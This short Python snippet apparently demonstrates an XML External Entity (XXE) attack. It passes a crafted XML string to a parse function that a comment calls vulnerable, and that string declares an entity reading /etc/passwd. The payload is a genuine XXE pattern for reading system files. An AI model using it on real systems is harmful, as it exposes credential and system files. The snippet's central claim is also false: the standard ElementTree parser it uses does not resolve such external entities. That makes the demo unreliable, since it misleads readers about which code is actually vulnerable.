import xml.etree.ElementTree as ET

def parse_xml(xml_string):
    # This is a vulnerable XML parsing function
    tree = ET.fromstring(xml_string)
    for elem in tree.iter():
        print(elem.tag, elem.text)

# Example of an XML string that an attacker could use for an XXE attack
xml_string = """
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<creds>
    <user>&xxe;</user>
    <pass>bar</pass>
</creds>
"""

parse_xml(xml_string)